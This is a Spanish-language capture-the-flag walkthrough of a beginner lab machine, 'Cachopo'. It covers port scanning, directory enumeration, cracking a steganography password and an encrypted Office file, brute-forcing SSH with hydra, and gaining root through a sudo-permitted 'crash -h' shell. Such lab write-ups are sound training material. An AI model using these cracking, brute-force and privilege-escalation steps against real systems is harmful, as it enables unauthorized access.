# Cachopo

Máquina de nivel principiante. IP: `192.168.33.107` — dominio: `cachopo.thl`

## 1. Reconocimiento

Realizamos un escaneo de puertos y servicios con `nmap -sV -sC`:

```
nmap -sV -sC 192.168.33.107
```

![[Pasted image 20261014134018.png]]

Se abren los puertos:
- **22/tcp** → OpenSSH 9.2p1 (Debian).
- **80/tcp** → Apache httpd 2.4.61, con el título **Cachopo** y un directorio `/cachopo.thl`.

## 2. Configuración del hosts

Para trabajar con el dominio, agregamos una entrada en el archivo `/etc/hosts`:

```
nano /etc/hosts
```

![[Pasted image 20261014134606.png]]

```
192.168.33.107  cachopo.thl
```

## 3. Enumeración web

Enumeramos directorios y archivos con `gobuster`:

```
gobuster dir -u http://cachopo.thl -w /home/kali/SecLists/Discovery/Web-Content/common.txt
```

![[Captura de pantalla 2026-10-14 135348.png]]

El servidor responde con `/html/`, `index.html` (200) y `server-status` (403).

Al visitar la página en el navegador vemos una fotografía de un cachopo, que descargamos como `cachopo.jpg`:

![[Captura de pantalla 2026-10-14 134928.png]]

## 4. Esteganografía

Como la imagen parece tener algo oculto, intentamos extraer contenido con `steghide`, pero nos pide una contraseña que aún no tenemos:

```
steghide extract -sf cachopo.jpg
```

![[Captura de pantalla 2026-10-14 135740 3.png]]

![[Captura de pantalla 2026-10-14 135740 2.png]]

![[Captura de pantalla 2026-10-14 135740 4.png]]

Para romper la contraseña usamos `stegcracker` con el diccionario `rockyou.txt`:

```
stegcracker cachopo.jpg /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20261014141357.png]]

La contraseña es **doggies** y el archivo extraído se guarda como `cachopo.jpg.out`. Al ver su contenido encontramos una pista:

```
cat cachopo.jpg.out
```

![[Captura de pantalla 2026-10-14 140609.png]]

```
el directorio es mycachopo
```

## 5. Directorio oculto

Con la pista anterior visitamos `http://cachopo.thl/mycachopo/`, donde aparece un listado con el archivo **Cocineros**:

![[Pasted image 20261014142812.png]]

Lo descargamos y vemos que es un archivo binario:

```
cat Cocineros
```

![[Pasted image 20261014143610.png]]

Con `file` identificamos su tipo real:

```
file Cocineros
```

![[Pasted image 20261014144018.png]]

```
Cocineros: CDFV2 Encrypted
```

Se trata de un documento de Microsoft Office cifrado, así que extraemos su hash y lo volcamos a un archivo para atacarlo con `john` y el diccionario `rockyou.txt`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Pasted image 20261014145400.png]]

La contraseña del documento es **horse1**. La usamos para abrir el archivo con LibreOffice:

![[Pasted image 20261014151235.png]]

Dentro del documento encontramos una lista de nombres, que servirá como diccionario de usuarios:

![[Pasted image 20261014151259.png]]

```
Sofía
Carlos
Luis
```

## 6. Fuerza bruta SSH

Con los nombres del documento como lista de usuarios, atacamos el servicio SSH con `hydra` y `rockyou.txt`:

```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.33.107
```

![[Captura de pantalla 2026-10-14 154009.png]]

Encontramos las credenciales válidas:

![[Pasted image 20261014161009.png]]

```
usuario: carlos
contraseña: bowwow
```

Nos conectamos por SSH y leemos la bandera de usuario:

```
ssh carlos@192.168.33.107
cat user.txt
```

![[Pasted image 20261014161215.png]]

## 7. Escalada de privilegios

Revisamos los permisos con `sudo -l` y vemos que podemos ejecutar `/usr/bin/crash` sin contraseña. Usamos `crash -h` para obtener una shell como root:

```
sudo /usr/bin/crash -h
```

Ya dentro como root, navegamos a `/root` y leemos la bandera final:

```
cd /root
cat root.txt
```

![[Captura de pantalla 2026-10-14 163132.png]]
